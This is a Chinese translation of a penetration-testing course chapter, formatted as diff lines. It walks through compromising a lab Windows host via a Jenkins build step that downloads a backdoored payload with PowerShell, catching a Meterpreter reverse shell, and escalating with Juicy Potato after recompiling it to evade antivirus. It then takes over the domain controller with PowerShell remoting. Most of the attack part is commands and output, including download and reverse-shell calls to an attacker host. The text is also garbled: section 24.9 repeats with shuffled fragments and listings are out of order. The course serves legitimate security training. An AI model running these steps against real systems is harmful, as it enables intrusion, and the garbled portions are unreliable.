+首先，让我们创建一个新的工作目录并将旧的 `whoami.exe` 载荷复制到其中。
+
+```
+kali@kali~$ cd cevapi
+
+kali@kali~$ mkdir cevapi
+
+kali@kali~$ cd cevapi/
+
+kali@cevapi~$ cp ../poultry/whoami.exe /
+```
+
+列表 986 - 为 Cevapi 创建工作目录
+
+接下来，我们将启动一个 HTTP 服务器，允许 Cevapi 下载载荷。
+
+```
+kali@cevapi~$ sudo python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0:80 (http://0.0.0.0:80/) / ...
+```
+
+列表 987 - 启动 HTTP 服务器
+
+在 Jenkins 中，我们将点击屏幕顶部面包屑导航中的 Access 链接。这将我们回到 Access 项目。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_837_0.png)
+
+图369：Access 项目页面
+
+接下来，我们点击侧边栏的“配置”（Configure）以打开配置页面，这允许我们更改构建命令。我们将尝试使用 PowerShell 下载文件。
+
+### 构建
+
+![](img/f99f528ca9845f4c256ce54e882b1345_838_0.png)
+
+图370：用于下载载荷的 PowerShell 命令
+
+具体来说，我们使用 `System.Net.WebClient` 对象中的 `DownloadFile` 方法来传入我们的 Kali IP 地址以及文件在文件系统的下载位置。
+
+```powershell
+powershell.exe (New-Object System.Net.Client).DownloadFile('http://10.11.0.4/whoami.exe', 'c:\Users\Public\whoami.exe')
+```
+
+设置好 PowerShell 命令后，我们将点击“保存”，这将带回到“Access”项目。在这里，我们选择“立即构建”来执行命令。如果命令执行成功，我们将在 Python 服务器中看到一条日志。
+
+Serving HTTP on 0.0.0.0:80 (http://0.0.0.0:80/) [12/Dec/2019 11:44] "GET /whoami.exe" 200
+
+现在文件已下载，我们可以停止 Python 服务器，并使用生成载荷时的相应参数启动 msfconsole。
+
+```
+kali@kali~$ sudo msfconsole -q -
+
+use exploit/multi/handler
+
+set PAYLOAD meterpreter/reverse_tcp
+
+set LHOST 10.11.0.4
+
+set LPORT 80
+
+run
+
+[*] Started reverse handler on 10.11.0.4
+```
+
+
+
+接下来，我们将返回 Jenkins 并配置项目运行 shell。这可以通过将命令设置为执行已下载的二进制文件的路径来实现。我们已准备好捕获 shell，在 Jenkins 中点击“立即构建”。如果一切按计划进行，我们应该会在 metasploit 中捕获反向 shell。
+
+```
+[+] Sending stage (18291 bytes) to 10.11.0.4
+[*] Meterpreter session 1 opened (10.11.0.4:12165) at 2019-12-12 07:30
+```
+
+```
+meterpreter > shell
+
+Process 4688 created.
+
+Channel 1 created.
+
+Microsoft Windows [Version 10.0.15063]
+
+(c) Microsoft Corporation. All rights reserved.
+```
+
+```
+C:\Program Files (x86)\Jenkins\workspace\Access>whoami
+cevapi\jenkinsuser
+```
+
+```
+C:\Program Files (x86)\Jenkins\workspace\Access>net user
+```
+
+命令成功执行。
+
+列表 999 - 获取 shell
+
+如预期所示，运行 Jenkins 的用户名为 `jenkinsuser`。该用户不在任何管理员组中。现在我们有了 shell，让我们开始枚举 Cevapi，以寻找权限提升的机会。
+
+## 24.8.3 提后枚举
+
+这是一个很好的停顿点，回顾一下我们目前拥有的东西。我们有两个攻破的 Linux 主机（Ajla 和 Zora）。第一个主机运行在外部网络，第二个在内部网络。我们还有 Poultry，一个加入了域的 Windows 主机，位于内部网络。最后，我们正在攻破 Cevapi。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_840_0.png)
+
+图371：包含 Cevapi 的网络图
+
+在对 Cevapi 进行探测之前，我们首先检查当前用户的权限。我们可以通过 `whoami /priv` 命令来实现。
+
+```
+C:\Program Files (x86)\Jenkins\workspace\Access>whoami /priv
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+```
+
+| 权限名称 | 说明 | 状态 |
+| :--- | :--- | :--- |
+| SeShutdownPrivilege | 关闭系统 | 禁用 |
+| SeChangeNotifyPrivilege | 跳过遍历检查 | 启用 |
+| SeUndockPrivilege | 从底座移除计算机 | 禁用 |
+| SeImpersonatePrivilege | 模拟客户端认证 | 启用 |
+| SeCreatedGlobalPrivilege | 创建全局对象 | 启用 |
+| SeIncreaseWorkingPrivilege | 增加进程工作系统 | 禁用 |
+| SeTimeZonePrivilege | 时区 | 禁用 |
+| 列表 992 | 检查权限 | |
+
+大部分权限都是标准的，但 `SeImpersonatePrivilege` 特别突出。它允许我们“模拟客户端认证”。在继续枚举时，我们会记住这个权限。
+
+接下来，我们可以收集一些系统的基本信息，以查看我们运行的操作系统版本以及 Cevapi 的补丁级别。
+
+```
+C:\Program Files (x86)\Jenkins\workspace\Access>systeminfo
+
+systeminfo
+```
+
+Host Name: CEVAPI
+OS Name: Microsoft Windows 10 Pro
+OS Version: 10.0.15063 N/A Build 15063
+OS Manufacturer: Microsoft Corporation
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+成员工作站
+
+OS 配置:
+...
+分页文件位置(s): `C:\logfile.sys`
+域:
+sandbox.local
+登录服务器:
+A/A
+热补丁:
+
++ 已安装 8 处热补丁。
+- [01]: KB4515840
+- [02]: KB4073543
+- [03]: KB4091663
+- [04]: KB4134668
+
+...
+
+列表 993 - 检查 systeminfo
+
+根据输出，我们可以得到运行在 Windows 10 build 15063 上的 api。根据 Windows 10 的版本，build 15063 安装于 2017 年 4 月 5 日的。我们在心中记住此版本的 Windows 不是最新的。我们还发现它安装了 8 个热补丁。如果我们稍后尝试利用 OS 漏洞来提升权限，这可能会很有用。该目标已加入域。
+
+让我们回到超级用户（Superuser）权限。在 Google 上快速搜索“elevate privileges Superuser”，使我们发现了一个名为“Juicy Potato”的利用程序。Juicy Potato 自述为“另一种本地权限提升工具，从 Windows 服务账户到 NT AUTHORITY\SYSTEM”。148 这正是我们需要的，让我们再深入挖掘一下。
+
+## 24.8.4 权限提升
+
+可以在此 github 页面上找到 Juicy Potato 的源代码：`https://github.com/ohpe/juicy-potato`。Juicy Potato 使用 Visual Studio 编写并可以对其进行编译。在审查代码后，我们没有发现任何引起关注的地方，因此可以认为该漏洞在我们的目标上运行是安全的。
+
+> 可以可以直接从 GitHub 下载 Juicy Potato 二进制文件，我们建议学生在审查源代码后自行编译自己的二进制文件，这是一种良好且更安全的做法。
+
+在这种情况下，该直接可用的文件被我们在实验室使用的 McAfee 解决方案检测为恶意软件。因此，我们首先需要识别出违规字节，并验证我们可以通过修改来绕过检测。通过借助稍微修改过的 Python 脚本使用文件拆分技术，149，我们意识到 AV 签名是基于包含生成的 PDB 文件路径的嵌入字符串的。由于这是编译过程的产物，规避方法相当简单：我们只需在没有 /DEBUG 标记的情况下编译 JuicyPotato 源码即可。这足以绕过 McAfee 的检测，因此我们将使用编译的二进制文件，它可以在实验室的 Windows 10 PWK VM 中找到。如果
+
+148 (Andrea Pierini, Giuseppe Trotta, 2019), https://ohpe.it/juicy-potato/
+149 (Github, 2013), https://github.com/rzweck/pysplit/blob/master/pysplit.py
+
+你有访问 Visual Studio，可以尝试自己编译该漏洞程序。
+
+一旦 `JuicyPotato.exe` (x86) 传输到我们的 Kali 机器，我们可以使用现有的 meterpreter shell 将其上传到 api。
+
+> 列表 994 - JuicyPotato.exe 已上传到 api
+
+在我们运行 `JuicyPotato.exe` 之前，还有一些其他参数必须建立。文档指出我们需要提供三个强制性参数：`-t`、`-p` 和 `-l`。⁵⁵⁰
+
+第一个要求的标志 (`-t`) 是“进程创建模式”。文档说明我们需要使用 `CreateProcessWithToken` 来使用 `SeImpersonate` 权限，我们直接让 Juicy Potato 使用 `CreateProcessWithToken`，我们将传递 t 值。
+
+接下来，`-p` 标志指定了我们尝试运行的程序。在这种情况下，我们可以之前使用的相同的带有后门的 `whoami.exe` 二进制文件。
+
+最后，JuicyPotato 允许我们通过 `-l` 标志为 COM 服务器指定一个任意端口。
+
+我们鼓励你阅读更多关于此攻击背后的机制以及工具本身的信息，但我们放入 Jenkins 的最终命令可以在列表 995 中。
+
+```
+C:\Users\Public\JuicyPotato.exe -t -p C:\Users\Public\whoami.exe -l 5873
+
+列表 995 - JuicyPotato 命令
+```
+
+接下来，我们将当前的 meterpreter 会话置于后台并启动一个新的监听器。
+
+```
+meterpreter > background
+
+[*] Started listener
+```
+
+
+
+## 24.9 目标：域控制器
+
+此时，我们已经攻破了两个 Linux 服务器：Ajla 和 Zora。通过 Zora 的内部网络访问，我们能够渗透到 Poultry。该主机允许我们对内部域进行初步的查看。从这里开始，我们攻破了 Cevapi，并直接在 Cevapi 上伪装了沙箱管理员的令牌。现在，我们需要使用这种伪装身份来获取对域控制器的访问。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_846_0.png)
+
+### 24.9.1 攻击域控制器
+
+由于有了以域管理员身份运行命令的能力，获取域控制器权限的一种方法是使用 PowerShell 的 `New-PSSession` 命令对远程主机开启新会话
+
+要执行此操作，我们将首先发现域控制器的主机名，以确保我们的目标是正确的服务器。为了发现主机名，我们使用 `nslookup`。
+
+```
+C:\Windows\system32>nslookup
+
+nslookup
+
+dns request timed out.
+
+timeout was 2 seconds.
+
+Default Server: Unknown
+
+Address: 10.5.5.30
+```
+
+- `set type=all`
+
+> _ldap_tcp.dc_mdcs.sandbox.local
+
+```
+Server: Unknown
+
+Address: 10.5.53.30
+```
+
+```
+_ldap_tcp.dc_mdcs.sandbox.local SRV service location:
+
+prior = 0
+
+weight = 100
+
+port = 339
+
+svr hostname = SANDBOXDC.sandbox.local
+
+SANDBOXDC.sandbox.local internet address = 10.5.53.30
+```
+
+```
+> exit
+```
+
+```
+C:\Windows\system32>
+```
+
+列表 1001 - 使用 `nslookup` 发现主机名
+
+在不带任何选项的情况下运行 `nslookup` 将会进入交互模式，允许我们设置要查找的记录类型。在这种情况下，查找类型是“all”。接下来，我们对 `sandbox` 域内的 `_ldap_tcp.dc_mdcs` 条目进行查询。这导致 `nslookup` 返回域控制器的主机名。
+
+在获取账户后，我们将从 `meterpreter` shell 中获取 `powershell`。
+
+```
+meterpreter > shell
+
+Process 260 created.
+
+Channel 5 created.
+
+...
+```
+
+```
+C:\Windows\system32>powershell
+
+powershell
+```
+
+```
+PS C:\Windows\system32>
+```
+
+列表 1002 - 启动 PowerShell
+
+在提示符处，我们将使用带有 `-Computer SANDBOXDC` 标志的 `New-PSSession` 在域控制器上启动一个新会话，该会话将被存在 `$dcsession` 对象中。
+
+```
+C:\Windows\system32>$dcsession = New-PSSession -Computer SANDBOXDC
+$dcsession = New-PSSession -Computer SANDBOXDC
+PS C:\Windows\system32>
+```
+
+列表 1003 - 创建新的 PowerShell 会话
+
+从这里开始，我们使用 `Invoke-Command` 命令在域控制器上运行命令。我们需要使用 `-Session` 标志指定会话，并使用 `-ScriptBlock` 命令指定要执行的命令。我们要获取的命令被封装在大括号中。检查域控制器 IP 的示例见下方。
+
+```
+PS C:\Windows\system32> Invoke-Command -Session $dcsession -ScriptBlock {ipconfig}
+Invoke-Command -Session $dcsession -ScriptBlock {ipconfig}
+```
+
+Windows IP 配置
+
+以太网适配器 Ethernet8:
+
+Connection-specific DNS Suffix : :
+
+Link-local IPv6 地址 : fe80::8539:433a:4360:175f%2
+IPv4 地址 : 10.5.5.30
+子网掩码 : 255.255.255.0
+默认网关 : 10.5.5.1
+
+列表 1004 - 使用 `Invoke-Command` 检查 IP
+
+现在我们就可以对域控制器执行命令了，我们将传输并使用 `meterpreter` shell。首先，我们必须将 shell 传输到域控制器。为此，我们将使用 PowerShell 的 `Copy-Item`。要传输到另一个主机，必须提供传输的文件、传输的目标以及我们创建的 PowerShell 会话。
+
+```
+PS C:\Windows\system32> Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -Session $dcsession
+```
+
+列表 1005 - 传输到域控制器
+
+文件传输完成后，我们需要执行它。否则，需要配置一个监听器来捕获反向 shell。为了执行此操作，我们将当前的 `meterpreter` shell 放入后台并启动一个新的监听器。在运行命令时，我们将使用 `-j` 标志将新的处理程序作为后台作业启动。
+
+```
+meterpreter > background
+[*] Backgrounding session 2...
+msf5 exploit(multi/handler) > run -j
+[*] running as background job 1.
+[*] completed, no session was created.
++] Started reverse TCP handler on 10.5.5.4:8
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+
+
+## 24.9 目标：域控制器
+
+此时，我们已经攻破了两个 Linux 服务器：Ajla 和 Zora。通过 Zora 的内部网络访问，我们能够渗透到 Poultry。该主机允许我们对内部域进行初步的查看。从这里开始，我们攻破了 Cevapi，并直接在 Cevapi 上伪装了沙箱管理员的令牌。现在，我们需要使用这种伪装身份来获取对域控制器的访问。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_846_0.png)
+
+### 24.9.1 攻击域控制器
+
+由于有了以域管理员身份运行命令的能力，获取域控制器权限的一种方法是使用 PowerShell 的 `New-PSSession` 命令对远程主机开启新会话。
+
+要执行此操作，我们将首先发现域控制器的主机名，以确保我们的目标是正确的服务器。为了发现主机名，我们使用 `nslookup`。
+
+```
+C:\Windows\system32>nslookup
+nslookup
+dns request timed out.
+timeout was 2 seconds.
+Default Server: Unknown
+Address: 10.5.5.30
+```
+
+`set type=all`
+
+现在我们就可以对域控制器执行命令了，我们将传输并使用 meterpreter shell。首先，我们必须将 shell 传输到域控制器。为此，我们将使用 PowerShell 的 `Copy-Item`。要传输到另一个主机，必须提供传输的文件、传输的目标以及我们创建的 PowerShell 会话。
+
+```
+PS C:\Windows\system32> Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -Session $dcsession
+```
+
+列表 1005 - 传输到域控制器
+
+文件传输完成后，我们需要执行它。否则，需要配置一个监听器来捕获反向 shell。为了执行此操作，我们将当前的 meterpreter shell 放入后台并启动一个新的监听器。在运行命令时，我们将使用 `-j` 标志将新的处理程序作为后台作业启动。
+
+```
+meterpreter > background
+[*] Backgrounding session 2...
+msf5 exploit(multi/handler) > run -j
+[*] running as background job 1.
+[*] completed, no session was created.
++] Started reverse TCP handler on 10.5.5.4:8
+```
+
+> _ldap_tcp.dc_mdcs.sandbox.local
+
+Server: Unknown
+Address: 10.5.53.30
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+
+
+_ldap_tcp.dc_mdcs.sandbox.local SRV service location:
+
+`prior = 0`
+
+`weight = 100`
+
+`port = 339`
+
+`svr hostname = SANDBOXDC.sandbox.local`
+
+`SANDBOXDC.sandbox.local internet address = 10.5.53.30`
+
+```
+> exit
+```
+
+```
+C:\Windows\system32>
+```
+
+### 列表 1001 - 使用 nslookup 发现主机名
+
+在不带任何选项的情况下运行 `nslookup` 将会进入交互模式，允许我们设置要查找的记录类型。在这种情况下，查找类型是“all”。接下来，我们对 `sandbox` 域内的 `_ldap_tcp.dc_mdcs` 条目进行查询。这导致 `nslookup` 返回域控制器的主机名。
+
+在获取账户后，我们将从 `meterpreter` shell 中获取 `powershell`。
+
+```
+meterpreter > shell
+Process 260 created.
+Channel 5 created.
+...
+```
+
+```
+C:\Windows\system32>powershell
+powershell
+```
+
+```
+PS C:\Windows\system32>
+```
+
+### 列表 1002 - 启动 PowerShell
+
+在提示符处，我们将使用带有 `-Computer SANDBOXDC` 标志的 `New-PSSession` 在域控制器上启动一个新会话，该会话将被存在 `dcsession` 对象中。
+
+```
+C:\Windows\system32>$dcsession = New-PSSession -Computer SANDBOXDC
+$dcsession = New-PSSession -Computer SANDBOXDC
+PS C:\Windows\system32>
+```
+
+### 列表 1003 - 创建新的 PowerShell 会话
+
+从这里开始，我们使用 `Invoke-Command` 命令在域控制器上运行命令。我们需要使用 `-Session` 标志指定会话，并使用 `-ScriptBlock` 命令指定要执行的命令。我们要获取的命令被封装在大括号中。检查域控制器 IP 的示例见下方。
+
+```
+PS C:\Windows\system32> Invoke-Command -Session $dcsession -ScriptBlock {ipconfig}
+Invoke-Command -Session $dcsession -ScriptBlock {ipconfig}
+```
+
+Windows IP 配置
+
+以太网适配器 Ethernet8:
+
+Connection-specific DNS Suffix : :
+
+Link-local IPv6 地址 : fe80::8539:433a:4360:175f%2
+IPv4 地址 : 10.5.5.30
+子网掩码 : 255.255.255.0
+默认网关 : 10.5.5.1
+
+### 列表 1004 - 使用 Invoke-Command 检查 IP
+
+现在我们就可以对域控制器执行命令了，我们将传输并使用 `meterpreter` shell。首先，我们必须将 shell 传输到域控制器。为此，我们将使用 PowerShell 的 `Copy-Item`。要传输到另一个主机，必须提供传输的文件、传输的目标以及我们创建的 PowerShell 会话。
+
+```
+PS C:\Windows\system32> Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -Session $dcsession
+```
+
+### 列表 1005 - 传输到域控制器
+
+文件传输完成后，我们需要执行它。否则，需要配置一个监听器来捕获反向 shell。为了执行此操作，我们将当前的 `meterpreter` shell 放入后台并启动一个新的监听器。在运行命令时，我们将使用 `-j` 标志将新的处理程序作为后台作业启动。
+
+```
+meterpreter > background
+[*] Backgrounding session 2...
+msf5 exploit(multi/handler) > run -j
+[*] running as background job 1.
+[*] completed, no session was created.
++] Started reverse TCP handler on 10.5.5.4:8
+```
+
+*(此处省略了原文中重复出现的段落，遵循指令要求)*
+
+# 25. 更加努力：实验环节
+
+你已被聘佣在课程期间对内部 VPN 网络进行渗透测试。主要目标是尽可能在多的机器和子网上获取 shell。你的目标是在每台机器上获得最高可能的权限级别（管理员/root）。
+
+你可以根据需要修改实验机器的管理员或 root 密码，或向系统添加额外用户；在完成攻击后，你可以使用你的学生控制面板将机器恢复到原始状态。某些机器具有多个攻击向量，因此强烈建议你花时间寻找尽可能多的机器。虽然你完全可以使用 web shell 在机器上建立立足点，但你的真实目标是获取到你 Kali 虚拟机或 GUI 的反向 shell（reverse shell），以便访问测试环境。
+
+**注意：** 位于每台机器上的 `proof.txt` 文件已记录在你的实验报告中，你应该省略它们。这些文件不会被视为最终目标（这是一次渗透测试，而不是夺旗赛活动）。在实验机器上获得高权限 shell 的感觉没有比这更美妙的了，你很快就会体验到那种感觉。
+
+## 25.1 现实场景模拟
+
+内部 VPN 网络包含许多可以使用客户端攻击利用的模拟客户端。这些客户端被编程为模拟常见的企业用户活动。整个实验过程中的细微提示可以帮助你定位这些模拟客户端。彻底的利用信息收集也可能揭示客户端之间的通信。
+
+不同的模拟客户端将在不同的时间间隔执行其任务。最常见的间隔是五分钟。
+
+一些实验机器维护了清理脚本。这些脚本专门用于客户端攻击向量，以确保机器/服务能够供其他学生使用。
+
+## 25.2 机器依赖关系
+
+某些目标可以在不先从另一台实验机器收集额外信息的情况下被利用。另一些目标可以通过跳板（pivot）进行利用。学生管理员不会提供有关机器依赖的细节。确定一台机器是否具有依赖关系是信息收集过程的重要部分，你需要自己发现这些信息。
+
+### 25.3 解锁网络
+
+最初，PWK 控制面板允许你将机器恢复到学生网络以及你专用的实验客户端机器。实验中的某些漏洞机器将包含一个带有 MD5 哈希值的 `network-secret.txt` 文件。这些哈希值将解锁你控制面板中额外的网络。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_851_0.png)
+
+### 25.4 路由
+
+IT、Dev 和 Admin 网络无法从学生网络直接路由，但公共学生网络可以从所有网络进行路由。你需要使用课程中涵盖的各种技术来访问其他网络。例如，你可能需要利用位于防火墙 NAT 之后的机器，利用双网卡主机或客户端代理。
+
+### 25.5 机器排序与攻击向量
+
+实验机器的 IP 地址并不重要。例如，你不需要从 `10.11.11.1` 开始并按数字顺序处理机器。作为一名渗透测试员，你需要学习的最重要技能之一是扫描几台机器以寻找“最容易得手的果实”（lowest-hanging fruit）。此外，请记住，在没有进入另一个网络之前，你可能无法完全破解特定的网络。
+
+### 25.6 防火墙 / 路由器 / NAT
+
+连接各个网络的防火墙和其他网络设备无法直接被利用。它们在测试范围内，你可以尝试获取它们的访问权限，但它们并不是为了让你这样做而创建的。此外，极不建议诸如暴力破解（bruteforcing）或 DOS/DDoS 等手段，因为它们将导致防火墙以及连接到它们的任何额外网络对你和其他人不可用。
+
+实验中的许多机器启用了软件防火墙，并可能对 ICMP 回显请求没有响应，这并不意味着机器已宕机或不存在。
+
+### 25.7 密码
+
+不需要在破解机器上花费过多的时间。如果你已经尝试了 Kali 中所有可用的字典文件，并利用了在整个实验过程中收集的信息，请停止并考虑不同的攻击向量。如果你有强力的破解硬件，则可以继续破解尽可能多的密码。
+
+## 25.8 总结
+
+如果你花时间理解了课程书籍和相关视频中提供的课程内容（包括“额外加分项”练习），你将享受整个实验评估。如果你仍然遇到困难，请考虑寻找课程材料中的空白，并退后一步，从新的角度观察问题。人们很容易执着于某一个挑战，而忽略了可能有更简单的解决方案在等待着的事实。做好良好的笔记并经常复习，寻找可能推进你评估的替代路径。当所有尝试都失败时，不要犹豫联系学生管理员。最后，请记住，你拥有解决面前问题所需的所有知识。不要放弃，记住“努力”（Try Hard）精神！
